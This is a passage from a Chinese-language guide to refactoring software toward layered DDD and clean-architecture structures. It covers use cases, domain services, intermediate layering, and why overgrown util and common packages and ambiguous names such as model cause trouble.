&lt;li&gt;&lt;strong&gt;application&lt;/strong&gt;：放各种 use case，use case 只能访问 domain 里面的 domain service&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;domain&lt;/strong&gt;：放各个聚合，各个聚合里面有一个 domain service，domain service 操作可以聚合根，包含业务逻辑&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;infrastructure&lt;/strong&gt;：放读取数据（服务，中间件），以及公共的 util 包&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我的同事 &lt;a href="https://github.com/howiehu"&gt;@howiehu&lt;/a&gt; 在 &lt;a href="https://github.com/howiehu/ddd-architecture-samples"&gt;DDD Architecture Samples&lt;/a&gt; 项目中使用了整洁架构分层如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;├── adapters      适配器
│   ├── inbound   入站适配器
│   └── outbound  出站适配器
├── application   应用层
│   ├── concepts
│   ├── dto
│   ├── gateway
│   └── usecases  用例
└── domain        领域层
    ├── contexts  限界上下文
    └── core      核心概念
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因此对于整洁架构的外部适配器，人们通过有多种叫法 interfaces、apis、facades、presentation、adapters 等等，&lt;/p&gt;
&lt;p&gt;而诸如 application、domain 和 infrastructure 来说，命名上倒是没有太大的区别。但是在实现上还是有相当大的区别：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;粘合层（service）&lt;/strong&gt;。在 application 中的粘合层倒是有不同的叫法 service（application service）、usecases、interactors。但是在真正实施的时候，还会有巨大的差别，采用 service 可能会出现上帝类，于是就出现用例驱动的 xxxUsecase。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;瘦 application vs 胖 application&lt;/strong&gt;。采用 PresentationDomainDataLayering 架构，即瘦 application 层，会把用例放在 domain 中；而采用胖 application 架构，则会把 usecase 放在 application 中。两者的使用场景的区别，主要取决于 CRUD 的&lt;strong&gt;纯净度&lt;/strong&gt;。如果你有 BFF，那么瘦 application 层适合于你；如果你是单体，又或者是跨实体操作多，那么胖 application 层适合你。&lt;/p&gt;
&lt;p&gt;不过，这些都不重要，重要的是要不要出现尖叫架构 —— 一看就懂得业务：&lt;/p&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/screaming-architecture.png"&gt;&lt;img src="images/screaming-architecture.png" alt="尖叫架构" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;你只需要回答一个问题，你的场景复杂吗？复杂的话，你就拆 —— 将复杂问题繁杂化。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-实施新分层架构" class="anchor" aria-hidden="true" href="#实施新分层架构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;实施新分层架构&lt;/h3&gt;
&lt;p&gt;实施新分层架构是一个持续的过程，它需要配合后续的各种重构模式。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-划分类移动代码" class="anchor" aria-hidden="true" href="#划分类移动代码"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;划分类，移动代码&lt;/h4&gt;
&lt;p&gt;这一步我们所做的是：移动旧的 service、controller、model 为竖直 + 水平架构。&lt;/p&gt;
&lt;p&gt;对于大单体应用来说，从分层架构上，移到新的架构并不难：按各种层级创建应用，移动代码。&lt;/p&gt;
&lt;p&gt;对于微服务架构应该来说，这一步也不算麻烦。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-技术模块化--重搭" class="anchor" aria-hidden="true" href="#技术模块化--重搭"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;技术模块化 =&amp;gt; 重搭&lt;/h4&gt;
&lt;p&gt;对于原先模块划分不合理的应用来说，如：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;├── pom.xml
├── zheng-api-common
│   └── pom.xml
├── zheng-api-rpc-api
│   └── pom.xml
├── zheng-api-rpc-service
│   └── pom.xml
└── zheng-api-server
    └── pom.xml
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为包、类之间本身是根据技术维度来划分的，如果我们计划以业务维度重新开发时，便就得创建新的目录结构，再移入新的类包。但是这样做的一个问题是，中间存在一个不可恢复的状态，会在一定程度上影响重构效果。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-中间态分层" class="anchor" aria-hidden="true" href="#中间态分层"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;中间态分层&lt;/h3&gt;
&lt;p&gt;考虑到服务重构的难度，它会存在着一个长期的中间态分层架构。原因有很多：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无法短期内重构完&lt;/li&gt;
&lt;li&gt;未拆到正确位置的 API&lt;/li&gt;
&lt;li&gt;领域层中的 repository 未拆分&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以，可以考虑将瘦 application 层作为中间态架构。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-验收条件构建" class="anchor" aria-hidden="true" href="#验收条件构建"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;验收条件：构建&lt;/h3&gt;
&lt;p&gt;是的，在这一步里，由于只是移动文件，所以只需要执行一下构建，你就能验证移动文件是否正确。&lt;/p&gt;
&lt;p&gt;不过，由于有 IDEA 这样的工具上，想必不是问题。&lt;/p&gt;
&lt;p&gt;然而，要是代码库过于庞大，那么我建议你试试 &lt;code&gt;coca refactor&lt;/code&gt;。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-潜在问题" class="anchor" aria-hidden="true" href="#潜在问题"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;潜在问题&lt;/h3&gt;
&lt;h4&gt;&lt;a id="user-content-bean-注入" class="anchor" aria-hidden="true" href="#bean-注入"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;bean 注入&lt;/h4&gt;
&lt;h4&gt;&lt;a id="user-content-解决冲突" class="anchor" aria-hidden="true" href="#解决冲突"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;解决冲突&lt;/h4&gt;
&lt;h4&gt;&lt;a id="user-content-同步-api-修改" class="anchor" aria-hidden="true" href="#同步-api-修改"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;同步 API 修改&lt;/h4&gt;
&lt;h4&gt;&lt;a id="user-content-对齐新分层架构" class="anchor" aria-hidden="true" href="#对齐新分层架构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;对齐新分层架构&lt;/h4&gt;
&lt;h2&gt;&lt;a id="user-content-公共代码重构" class="anchor" aria-hidden="true" href="#公共代码重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;公共代码重构&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;小步前进，拉一下最新的代码。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;创建通用的共享组件导致了一系列问题，比如耦合、协调难度和复杂度增加。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;当我看到一个个巨大的 common 包时，我开始痛恨 &lt;code&gt;common&lt;/code&gt;、&lt;code&gt;base&lt;/code&gt;、&lt;code&gt;util&lt;/code&gt; 这些该死的包，还有它们目录下统一管理的 &lt;code&gt;bean&lt;/code&gt;。我们真的已经把它们用烂了，所以你应该重新审视一下你的项目代码。&lt;/p&gt;
&lt;p&gt;所以，从这种意义上来说：&lt;strong&gt;复用与低耦合&lt;/strong&gt;，本身存在一定的互斥关系。&lt;/p&gt;
&lt;p&gt;公共代码往往缺乏抽象，又或者是追求过度的复用。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-它真是个-util-吗" class="anchor" aria-hidden="true" href="#它真是个-util-吗"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;它真是个 util 吗？&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;哦，不，它是个恶魔，因为它是 util。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;你会往 xxUtil 不加思索地扔入逻辑，正如你会往 common/bean 中扔入所有的 model，直次有一天，你拥有一个巨大无比的 base、common 代码。&lt;/p&gt;
&lt;p&gt;大多数情况下，所有和业务相关的 Util 都存在一定的问题，如 CaptchaUtil，它要么应该划到自己的上下文中去，要么扔到诸如于 domain/shared 等共享上下文，而不是和其它 util 放到一起。&lt;/p&gt;
&lt;p&gt;而诸如 FileUtil、DateUtil、RedisUtil、JdbcUtil 这些都可以说是基础设施相关的部分，它们可以划到 infrastructure/file 又或者是 infrastructure/date 目录下，而不是统一的管理这些 util。&lt;/p&gt;
&lt;p&gt;如 &lt;a href="https://stackoverflow.com/questions/1866794/naming-classes-how-to-avoid-calling-everything-a-whatevermanager" rel="nofollow"&gt;StackOverflow&lt;/a&gt; 的相关问题所列，我们还有诸如 Coordinator、Builder、Writer、Reader、Handler、Container、Protocol、Target、Converter、Controller、View、Factory、Entity、Bucket 等名称。&lt;/p&gt;
&lt;p&gt;试着干掉 Util，你将收获更多的类，笑~。&lt;/p&gt;
&lt;p&gt;Utils / Helper 多数是恶魔，无法满足单一职责和开闭原则。好的 OO 设计，大部分的类只表示一个事物，及其所有属性和操作。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;尽可能减少 Utils / Helper 类。好的 OO 设计，大部分的类只表示一个事物，及其所有属性和操作。&lt;/li&gt;
&lt;li&gt;如果使用一个 Util 用于操作类，如如 IList，那么它应该划到类中。除非该类不存在于当前的应用中。&lt;/li&gt;
&lt;li&gt;Util 中的方法应该是无状态的，比如没有 static 变量。&lt;/li&gt;
&lt;li&gt;如果有大量的 utils 方法，应该把划分到类中，以便快速找到它们。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3&gt;&lt;a id="user-content-过度设计" class="anchor" aria-hidden="true" href="#过度设计"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;过度设计&lt;/h3&gt;
&lt;p&gt;好的设计是尽可能简单的，它最易于适应新的设计，并能跟随业务的变化而变化。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;开发人员：『这个功能是给未来准备的』&lt;/li&gt;
&lt;li&gt;Tech Lead：未来是多久？一个月后？半年后？&lt;/li&gt;
&lt;li&gt;开发人员：……&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a target="_blank" rel="noopener noreferrer" href="images/balanced-design.png"&gt;&lt;img src="images/balanced-design.png" alt="" style="max-width:100%;"&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;图片出自：&lt;a href="https://stackoverflow.com/questions/1001120/what-is-over-engineering-as-applied-to-software" rel="nofollow"&gt;https://stackoverflow.com/questions/1001120/what-is-over-engineering-as-applied-to-software&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;与之相对应的设计不足，则是因为经验的缘故。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-重新定义消除二义性" class="anchor" aria-hidden="true" href="#重新定义消除二义性"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;重新定义：消除二义性&lt;/h3&gt;
&lt;p&gt;当我们谈论 service 的时候，我们谈论的是同一个 service 吗？&lt;/p&gt;
&lt;p&gt;当我们谈论 model 的时候，我们谈论的是同一种 model 吗？&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;若对于一个文法的某一句子存在两棵不同的语法树，则该文法是二义性文法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;如果有多种不同类型的类，都被放置在 model 包下。那么，你应该消除 model 这个包，改为更表意的名称，如 Entity、Request、Response 等等。同理，一旦你们展开对某个名称的讨论时，是时候好好考虑其中的二义性。&lt;/p&gt;
&lt;p&gt;最后，你还需要有一个相关领域的名词表。&lt;/p&gt;
&lt;p&gt;避免产生二异性的词语。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-类进行内聚" class="anchor" aria-hidden="true" href="#类进行内聚"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;类进行内聚&lt;/h3&gt;
&lt;p&gt;参考下文中的模型重构。&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-划分技术部分" class="anchor" aria-hidden="true" href="#划分技术部分"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;划分技术部分&lt;/h3&gt;
&lt;p&gt;如 Spring 框架的源码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;└── springframework
    ├── cache
    │   ├── annotation
    │   ├── concurrent
    │   ├── config
    │   ├── interceptor
    │   └── support
    ├── context
    │   ├── annotation
    │   ├── config
    │   ├── event
    │   ├── expression
    │   ├── i18n
    │   ├── index
    │   ├── support
    │   └── weaving
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;&lt;a id="user-content-划分业务部分" class="anchor" aria-hidden="true" href="#划分业务部分"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;划分业务部分&lt;/h3&gt;
&lt;p&gt;业务模块中的技术部分。&lt;/p&gt;
&lt;h4&gt;&lt;a id="user-content-职责少--平级" class="anchor" aria-hidden="true" href="#职责少--平级"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;职责少 =&amp;gt; 平级&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;└── orm
    ├── context
    ├── support
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;&lt;a id="user-content-业务代码多--再按业务拆分" class="anchor" aria-hidden="true" href="#业务代码多--再按业务拆分"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;业务代码多 =&amp;gt; 再按业务拆分&lt;/h4&gt;
&lt;pre&gt;&lt;code&gt;infrastructure
└── repository
    ├── context
    │   ├── blog
    │   ├── advert
    │   └── pages
    ├── kafka
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;a id="user-content-模块重构" class="anchor" aria-hidden="true" href="#模块重构"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;模块重构&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;小步前进，拉一下最新的代码。&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;模块/组件是软件的部署单元，是整个软件系统在部署过程中可以&lt;strong&gt;独立部署&lt;/strong&gt;的最小实体。 —— 《架构整洁之道》&lt;/p&gt;
&lt;/blockquote&gt;
